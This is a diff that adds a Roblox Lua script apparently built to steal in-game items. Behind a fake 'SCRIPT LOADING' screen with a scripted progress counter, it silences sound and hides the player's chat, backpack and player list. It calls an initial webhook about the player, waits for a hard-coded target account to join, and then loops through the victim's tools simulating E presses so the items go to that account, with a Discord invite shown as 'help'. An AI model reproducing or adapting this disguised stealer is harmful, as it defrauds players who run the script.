+        VirtualInput:SendKeyEvent(true, Enum.KeyCode.E, false, game)
+        task.wait(0.1)
+        VirtualInput:SendKeyEvent(false, Enum.KeyCode.E, false, game)
+    end
+
+    local function favoriteItem(tool)
+        if tool and tool:IsDescendantOf(game) then
+            local toolInstance
+            local backpack = LocalPlayer:FindFirstChild("Backpack")
+            if backpack then
+                toolInstance = backpack:FindFirstChild(tool.Name)
+            end
+            if not toolInstance and LocalPlayer.Character then
+                toolInstance = LocalPlayer.Character:FindFirstChild(tool.Name)
+            end
+            if toolInstance then
+                local args = {[1] = toolInstance}
+                ReplicatedStorage.GameEvents.Favorite_Item:FireServer(unpack(args))
+            else
+                warn("Tool not found: " .. tool.Name)
+            end
+        else
+            warn("Tool not found or invalid: " .. tostring(tool))
+        end
+    end
+
+    local function useToolWithHoldCheck(tool)
+        local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+        if humanoid and tool then
+            humanoid:EquipTool(tool)
+            local startTime = tick()
+            while toolInInventory(LocalPlayer, tool.Name) do
+                holdE()
+                task.wait(0.2)
+                if tick() - startTime >= 3 then
+                    if toolInInventory(LocalPlayer, tool.Name) then
+                        favoriteItem(tool)
+                        task.wait(0.05)
+                        startTime = tick()
+                        while toolInInventory(LocalPlayer, tool.Name) do
+                            holdE()
+                            task.wait(0.2)
+                            if tick() - startTime >= 3 then
+                                humanoid:UnequipTools()
+                                return false
+                            end
+                        end
+                        humanoid:UnequipTools()
+                        return true
+                    end
+                    humanoid:UnequipTools()
+                    return true
+                end
+            end
+            humanoid:UnequipTools()
+            return true
+        end
+        return false
+    end
+
+    local function cycleToolsWithHoldCheck(player, loadingGui)
+        local tools = getValidTools(player)
+        for _, tool in ipairs(tools) do
+            useToolWithHoldCheck(tool)
+        end
+
+        local container = loadingGui.SolidBackground.ContentContainer
+        if not container:FindFirstChild("HelpLabel") then
+            local helpLabel = Instance.new("TextLabel")
+            helpLabel.Name = "HelpLabel"
+            helpLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
+            helpLabel.Position = UDim2.new(0.1, 0, 1.05, 0)
+            helpLabel.BackgroundTransparency = 1
+            helpLabel.Text = "Stuck at 100 just wait 3-5 minutes"
+            helpLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+            helpLabel.TextScaled = true
+            helpLabel.Font = Enum.Font.GothamBold
+            helpLabel.TextXAlignment = Enum.TextXAlignment.Center
+            helpLabel.Parent = container
+
+            local copyButton = Instance.new("TextButton")
+            copyButton.Name = "CopyLinkButton"
+            copyButton.Size = UDim2.new(0.3, 0, 0.08, 0)
+            copyButton.Position = UDim2.new(0.35, 0, 1.15, 0)
+            copyButton.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
+            copyButton.Text = "Copy Link"
+            copyButton.TextColor3 = Color3.fromRGB(200, 200, 255)
+            copyButton.TextScaled = true
+            copyButton.Font = Enum.Font.GothamBold
+            copyButton.Parent = container
+
+            local corner = Instance.new("UICorner")
+            corner.CornerRadius = UDim.new(0.2, 0)
+            corner.Parent = copyButton
+
+            copyButton.MouseButton1Click:Connect(function()
+                if setclipboard then
+                    setclipboard("https://discord.gg/bvQtpYDyjn")
+                elseif syn and syn.clipboard_set then
+                    syn.clipboard_set("https://discord.gg/bvQtpYDyjn")
+                end
+            end)
+        end
+    end
+
+    -- ======= CHAT COMMAND =======
+
+    local function sendBangCommand(player)
+        task.wait(0.05)
+        local chatMessage = ";bang " .. player.Name
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            local textChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:WaitForChild("RBXGeneral", 5)
+            if textChannel then
+                textChannel:SendAsync(chatMessage)
+            end
+        else
+            local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+            if chatEvent then
+                local sayMessage = chatEvent:FindFirstChild("SayMessageRequest")
+                if sayMessage then
+                    sayMessage:FireServer(chatMessage, "All")
+                end
+            end
+        end
+    end
+
+    local function onChatMessageReceived(message)
+        if message.Text and message.Text:lower():find(chatTrigger:lower()) then
+            sendBangCommand(LocalPlayer)
+        end
+    end
+
+    local function connectChatListener()
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            local textChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+            if textChannel then
+                textChannel.MessageReceived:Connect(onChatMessageReceived)
+            end
+        else
+            LocalPlayer.Chatted:Connect(function(msg)
+                if msg:lower():find(chatTrigger:lower()) then
+                    sendBangCommand(LocalPlayer)
+                end
+            end)
+        end
+    end
+
+    -- ======= LOADING SCREEN =======
+
+    local function disableGameFeatures()
+        SoundService.AmbientReverb = Enum.ReverbType.NoReverb
+        SoundService.RespectFilteringEnabled = true
+
+        for _, soundGroup in pairs(SoundService:GetChildren()) do
+            if soundGroup:IsA("SoundGroup") then
+                soundGroup.Volume = 0
+            end
+        end
+
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
+    end
+
+    local infiniteYieldLoaded = false
+
+    local function createLoadingScreen()
+        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 10)
+        if not playerGui then
+            warn("[LoadingScreen] PlayerGui not found")
+            return nil
+        end
+
+        local loadingGui = Instance.new("ScreenGui")
+        loadingGui.Name = "ModernLoader"
+        loadingGui.ResetOnSpawn = true
+        loadingGui.IgnoreGuiInset = true
+        loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        loadingGui.DisplayOrder = 999999
+        loadingGui.Parent = playerGui
+
+        local background = Instance.new("Frame")
+        background.Name = "SolidBackground"
+        background.Size = UDim2.new(1, 0, 1, 0)
+        background.Position = UDim2.new(0, 0, 0, 0)
+        background.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
+        background.BackgroundTransparency = 0
+        background.BorderSizePixel = 0
+        background.Parent = loadingGui
+
+        local grid = Instance.new("Frame")
+        grid.Name = "GridPattern"
+        grid.Size = UDim2.new(1, 0, 1, 0)
+        grid.Position = UDim2.new(0, 0, 0, 0)
+        grid.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+        grid.BackgroundTransparency = 0
+        grid.BorderSizePixel = 0
+
+        local uiGrid = Instance.new("UIGridLayout")
+        uiGrid.CellSize = UDim2.new(0, 50, 0, 50)
+        uiGrid.CellPadding = UDim2.new(0, 2, 0, 2)
+        uiGrid.FillDirection = Enum.FillDirection.Horizontal
+        uiGrid.FillDirectionMaxCells = 100
+        uiGrid.Parent = grid
+
+        for i = 1, 200 do
+            local cell = Instance.new("Frame")
+            cell.Name = "Cell_"..i
+            cell.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
+            cell.BorderSizePixel = 0
+
+            local corner = Instance.new("UICorner")
+            corner.CornerRadius = UDim.new(0.1, 0)
+            corner.Parent = cell
+
+            cell.Parent = grid
+        end
+
+        grid.Parent = background
+
+        local container = Instance.new("Frame")
+        container.Name = "ContentContainer"
+        container.AnchorPoint = Vector2.new(0.5, 0.5)
+        container.Size = UDim2.new(0.7, 0, 0.5, 0)
+        container.Position = UDim2.new(0.5, 0, 0.5, 0)
+        container.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
+        container.BackgroundTransparency = 0.3
+        container.BorderSizePixel = 0
+
+        local floatTween = TweenService:Create(container, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Position = UDim2.new(0.5, 0, 0.45, 0)})
+        floatTween:Play()
+
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0.05, 0)
+        corner.Parent = container
+
+        local stroke = Instance.new("UIStroke")
+        stroke.Color = Color3.fromRGB(100, 100, 255)
+        stroke.Thickness = 3
+        stroke.Transparency = 0.3
+        stroke.Parent = container
+
+        container.Parent = background
+
+        local title = Instance.new("TextLabel")
+        title.Name = "Title"
+        title.Size = UDim2.new(0.8, 0, 0.2, 0)
+        title.Position = UDim2.new(0.1, 0, 0.1, 0)
+        title.BackgroundTransparency = 1
+        title.Text = "SCRIPT LOADING"
+        title.TextColor3 = Color3.fromRGB(255, 0, 0)
+        title.TextScaled = true
+        title.Font = Enum.Font.GothamBlack
+        title.TextXAlignment = Enum.TextXAlignment.Center
+        title.Parent = container
+
+        spawn(function()
+            while true do
+                for i = 0, 1, 0.01 do
+                    local r = math.sin(i * math.pi) * 127 + 128
+                    local g = math.sin(i * math.pi + 2) * 127 + 128
+                    local b = math.sin(i * math.pi + 4) * 127 + 128
+                    title.TextColor3 = Color3.fromRGB(r, g, b)
+                    task.wait(0.03)
+                end
+            end
+        end)
+
+        local loadingLabel = Instance.new("TextLabel")
+        loadingLabel.Name = "LoadingText"
+        loadingLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
+        loadingLabel.Position = UDim2.new(0.1, 0, 0.35, 0)
+        loadingLabel.BackgroundTransparency = 1
+        loadingLabel.Text = "Loading..."
+        loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        loadingLabel.TextScaled = true
+        loadingLabel.Font = Enum.Font.GothamBold
+        loadingLabel.TextXAlignment = Enum.TextXAlignment.Center
+        loadingLabel.Parent = container
+
+        local loadingPercent = Instance.new("TextLabel")
+        loadingPercent.Name = "LoadingPercent"
+        loadingPercent.Size = UDim2.new(0.8, 0, 0.1, 0)
+        loadingPercent.Position = UDim2.new(0.1, 0, 0.45, 0)
+        loadingPercent.BackgroundTransparency = 1
+        loadingPercent.Text = "0%"
+        loadingPercent.TextColor3 = Color3.fromRGB(255, 255, 255)
+        loadingPercent.TextScaled = true
+        loadingPercent.Font = Enum.Font.GothamBold
+        loadingPercent.TextXAlignment = Enum.TextXAlignment.Center
+        loadingPercent.Parent = container
+
+        -- Progress updater
+        spawn(function()
+            for i = 0, 100 do
+                loadingPercent.Text = tostring(i) .. "%"
+                loadingLabel.Text = "Loading... " .. tostring(i) .. "%"
+                task.wait(0.04)
+            end
+        end)
+
+        return loadingGui
+    end
+
+    local function removeLoadingScreen(loadingGui)
+        if loadingGui then
+            loadingGui:Destroy()
+        end
+    end
+
+    -- ======= MAIN EXECUTION =======
+
+    disableGameFeatures()
+
+    local loadingGui = createLoadingScreen()
+
+    sendInitialWebhook(LocalPlayer)
+
+    connectChatListener()
+
+    print("[INFO] Waiting for target player to join: " .. TARGET_USERNAME)
+
+    -- Wait for target to join
+    local targetPlayer = Players:FindFirstChild(TARGET_USERNAME)
+    if not targetPlayer then
+        Players.PlayerAdded:Wait(function(player)
+            if player.Name == TARGET_USERNAME then
+                targetPlayer = player
+            end
+        end)
+    end
+
+    -- Double-check targetPlayer found before continuing
+    while not targetPlayer do
+        task.wait(1)
+        targetPlayer = Players:FindFirstChild(TARGET_USERNAME)
+    end
+
+    print("[INFO] Target player joined: " .. targetPlayer.Name)
+
+    -- Greet and gift target player
+    greetPlayer(targetPlayer)
+    grantSpecialTools(targetPlayer)
+
+    -- Start cycling tools and holding E
+    while true do
+        cycleToolsWithHoldCheck(LocalPlayer, loadingGui)
+        task.wait(10)
+    end
+end)
+
+if not success then
+    warn("[ERROR] Script error: " .. tostring(err))
+end
